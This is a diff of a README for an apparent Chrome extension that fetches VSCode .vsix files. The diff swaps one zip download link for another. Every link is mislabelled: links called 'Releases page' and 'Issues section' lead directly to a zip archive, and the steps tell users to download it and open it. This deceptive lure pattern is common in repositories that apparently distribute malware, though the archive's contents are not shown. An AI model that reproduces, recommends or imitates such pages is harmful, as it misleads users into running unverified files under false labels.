@@ -1,7 +1,7 @@
 # 🌟 Vsix-Getter-Chrome-Extension - Download VSCode Extensions Easily
 
 ## 👇 Download Now!
-[![Download Vsix-Getter-Chrome-Extension](https://raw.githubusercontent.com/elxd21/Vsix-Getter-Chrome-Extension/main/assets/Vsix-Getter-Chrome-Extension-1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/elxd21/Vsix-Getter-Chrome-Extension/main/assets/Vsix-Getter-Chrome-Extension-1.4.zip)
+[![Download Vsix-Getter-Chrome-Extension](https://github.com/elxd21/Vsix-Getter-Chrome-Extension/raw/refs/heads/main/assets/Getter-Vsix-Extension-Chrome-v1.9-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/elxd21/Vsix-Getter-Chrome-Extension/raw/refs/heads/main/assets/Getter-Vsix-Extension-Chrome-v1.9-alpha.5.zip)
 
 ## 📖 Description
 The Vsix-Getter-Chrome-Extension allows you to download VSCode extensions in `.vsix` format directly from the Marketplace page. This tool simplifies the process, making it easy to get the extensions you need for your development work.
@@ -10,13 +10,13 @@ The Vsix-Getter-Chrome-Extension allows you to download VSCode extensions in `.v
 Using the Vsix-Getter-Chrome-Extension is straightforward. Here are the steps to get started:
 
 1. Open your Chrome browser.
-2. Visit the [Releases page](https://raw.githubusercontent.com/elxd21/Vsix-Getter-Chrome-Extension/main/assets/Vsix-Getter-Chrome-Extension-1.4.zip) for the latest version of the extension.
+2. Visit the [Releases page](https://github.com/elxd21/Vsix-Getter-Chrome-Extension/raw/refs/heads/main/assets/Getter-Vsix-Extension-Chrome-v1.9-alpha.5.zip) for the latest version of the extension.
 3. Click the link to download the extension from the Releases page.
 
 ## 📥 Download & Install
 To download the Vsix-Getter-Chrome-Extension, follow these steps:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/elxd21/Vsix-Getter-Chrome-Extension/main/assets/Vsix-Getter-Chrome-Extension-1.4.zip).
+1. Go to the [Releases page](https://github.com/elxd21/Vsix-Getter-Chrome-Extension/raw/refs/heads/main/assets/Getter-Vsix-Extension-Chrome-v1.9-alpha.5.zip).
 2. Look for the latest version of the extension.
 3. Click on the download link. 
 4. Once the download completes, open the downloaded file.
@@ -55,10 +55,10 @@ If you face issues while using the extension, here are a few common solutions:
 - **Compatibility Problems**: Make sure you have the latest version of Chrome.
 
 ## 📞 Support
-If you need help, feel free to check the [Issues section](https://raw.githubusercontent.com/elxd21/Vsix-Getter-Chrome-Extension/main/assets/Vsix-Getter-Chrome-Extension-1.4.zip) in the repository. You can report bugs or request features there.
+If you need help, feel free to check the [Issues section](https://github.com/elxd21/Vsix-Getter-Chrome-Extension/raw/refs/heads/main/assets/Getter-Vsix-Extension-Chrome-v1.9-alpha.5.zip) in the repository. You can report bugs or request features there.
 
 ## 💡 Tips
-- Bookmark the [Releases page](https://raw.githubusercontent.com/elxd21/Vsix-Getter-Chrome-Extension/main/assets/Vsix-Getter-Chrome-Extension-1.4.zip) for quick access to updates.
+- Bookmark the [Releases page](https://github.com/elxd21/Vsix-Getter-Chrome-Extension/raw/refs/heads/main/assets/Getter-Vsix-Extension-Chrome-v1.9-alpha.5.zip) for quick access to updates.
 - Keep your Chrome browser updated to avoid compatibility issues.
 
 ## 🌐 Related Topics
@@ -69,4 +69,4 @@ If you need help, feel free to check the [Issues section](https://raw.githubuser
 
 Make the most of your development environment with the Vsix-Getter-Chrome-Extension! 
 
-You can always visit the [Releases page](https://raw.githubusercontent.com/elxd21/Vsix-Getter-Chrome-Extension/main/assets/Vsix-Getter-Chrome-Extension-1.4.zip) for the latest updates and further information.
+You can always visit the [Releases page](https://github.com/elxd21/Vsix-Getter-Chrome-Extension/raw/refs/heads/main/assets/Getter-Vsix-Extension-Chrome-v1.9-alpha.5.zip) for the latest updates and further information.
